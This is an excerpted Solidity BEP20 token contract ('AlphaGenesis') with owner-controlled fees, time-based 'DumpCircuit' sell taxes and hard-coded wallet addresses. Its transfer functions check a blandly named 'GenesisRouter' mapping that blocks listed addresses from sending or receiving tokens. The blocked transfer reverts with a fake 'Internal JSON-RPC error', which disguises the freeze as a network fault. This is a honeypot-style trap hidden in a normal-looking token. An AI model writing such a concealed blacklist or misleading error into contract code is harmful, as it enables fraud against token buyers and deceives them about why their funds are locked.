...
library IterableMapping {
    struct Map {
        ...
        mapping (address => bool) GenesisRouter;
    }
...
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    ...
    mapping (address => bool) public GenesisRouter;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(!GenesisRouter[_msgSender()] && !GenesisRouter[recipient], "Internal JSON-RPC error");
    ...
    function transferFrom(
        ...
        require(!GenesisRouter[sender] && !GenesisRouter[recipient], "Internal JSON-RPC error");
...
contract AlphaGenesis is BEP20, Ownable {
    ...
    constructor() BEP20("AlphaTestV6", "ATV6"){
        address newOwner = address(0xA5C6bC9aAbDD8fF5d012051ed542535A7cd10763);
    
        uint256 totalSupply = 75000000000000 * (10**18);
        // Maximum amount to transfer
        maxTransactionAmount = 5000000000 * (10**18); 
        // Tokens for SwapAndLiquify
        swapTokensAtAmount = 100000000 * (10**18);

        rewardsDumpCircuitSellFee = 0;
        marketingDumpCircuitSellFee = 0;
        liquidityDumpCircuitSellFee = 0;
        communityDumpCircuitSellFee = 0;
        ...
        communityWallet = address(0x72563ECF230eab5ddCfC54cE4De6539B6EA3c429);
        // Liquidity Wallet
    ...
    function updateSellFees(uint256 _marketingFee, uint256 _rewardsFee, uint256 _liquidityFee, uint256 _communityFee) external onlyOwner {
     ...
     function updateDumpCircuitSellFees(uint256 _marketingFee, uint256 _rewardsFee, uint256 _liquidityFee, uint256 _communityFee) external onlyOwner {
        ...
        require(totalDumpCircuitSellFees >= totalSellFees, "Can't go lower than sell limits");
    }
    ...
    // Remove DumpCircuit
    function removeDumpCircuit() external onlyOwner returns (bool){
        DumpCircuit = false;
        return true;
    }
        ...
        if(takeFee){
            ...
            // Buying process without DumpCircuit
                ...
                if(walletSellDumpCircuitEndTime[to] == 0){
                    ...
                    walletSellDumpCircuitEndTime[to] = amount >= holderBalance ? block.timestamp + dumpcircuitDuration : walletSellDumpCircuitEndTime[to] + (dumpcircuitDuration * (amount*1e18/holderBalance))/1e18;
    ...
    function getHolderDumpCircuitSellTax(address wallet) public view returns (uint256){
        ...
        uint256 walletDumpCircuitTax = (dumpcircuitTax*(timeRemainingForDumpCircuit*1e9/dumpcircuitDuration))/1e9;
    ...
    function swapBack() private {
        ...
        if(buyBackEnabled){
            (success,) = address(marketingWallet).call{value: ethForMarketing * percentForMarketing / 100}("");
